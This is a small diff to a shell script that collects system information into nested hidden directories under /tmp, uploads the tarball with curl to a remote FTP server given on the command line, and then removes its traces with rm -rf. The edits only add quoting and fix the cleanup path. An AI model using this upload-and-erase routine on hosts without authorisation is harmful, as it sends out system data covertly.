@@ -5,11 +5,11 @@
 
 
 # FTP Server
-FTP_SERVER=$1
+FTP_SERVER="$1"
 
 # FTP Credential
-USER=$2
-PASSWORD=$3
+USER="$2"
+PASSWORD="$3"
 
 INFO_DIR="/tmp/.p/.w/.n/.d/"
 
@@ -93,4 +93,4 @@ tar cfz $(hostname)_sysinfo.tgz *.txt > /dev/null
 curl -sT $INFO_DIR/$(hostname)_sysinfo.tgz ftp://${FTP_SERVER} --user ${USER}:${PASSWORD}
 
 # Cleanup
-rm -rf /tmp/p
+rm -rf /tmp/.p
